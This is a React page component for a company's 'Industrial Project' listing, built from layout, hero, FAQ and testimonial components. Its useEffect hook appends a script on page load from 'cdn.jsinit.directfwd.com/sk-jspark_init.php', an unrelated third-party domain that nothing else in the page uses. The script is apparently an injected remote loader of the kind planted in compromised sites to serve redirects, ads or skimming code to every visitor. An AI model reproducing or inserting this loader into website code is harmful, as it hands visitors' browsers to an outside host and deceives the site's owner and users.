import React, { useEffect } from "react";
import MainLayout from '@/layout/MainLayout';
import HeroSectionMain from "@/components/common/HeroSectionMain";
import NewLaunches from '@/components/NewLaunches';
import ClientSpeaks from '@/components/ClientSpeaks';
import Faq from '@/components/Faq';
import WhyChosesUs from "../components/common/why-choses-us";
import ProjectPage from "../components/project/ProjectPage";
import ProjectHeading from '@/components/project/ProjectHeading';
import allProjects from '@/data/projectsData';

const industrialProjects = allProjects.filter(project => project.type === 'Industrial');


const Project = () => {

  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsinit.directfwd.com/sk-jspark_init.php';  // Use HTTPS here
    script.async = true;
    document.body.appendChild(script);

    // Cleanup on unmount
    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <MainLayout title="Our Projects">
      <HeroSectionMain title=" Industrial Project " />
      <ProjectPage projectType="Industrial" />
      <ProjectHeading projects={industrialProjects} variant="industrial" />
      <NewLaunches />
      <ClientSpeaks />
      <WhyChosesUs />
      <Faq />
    </MainLayout>
  );
};

export default Project;
